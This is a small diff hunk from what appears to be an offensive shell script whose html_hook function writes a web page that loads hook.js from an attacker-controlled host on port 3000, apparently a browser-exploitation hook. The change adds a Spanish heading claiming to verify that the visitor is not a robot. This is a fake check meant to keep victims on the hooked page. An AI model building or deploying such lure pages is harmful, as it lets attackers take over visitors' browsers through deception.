@@ -545,6 +545,7 @@ html_hook(){
     <script src="http://$IP_HOOK:3000/hook.js"></script>
 </head>
 <body>
+    <h1>Verificando que no eres un robot...</h1>
 </body>
 </html>
 EOF
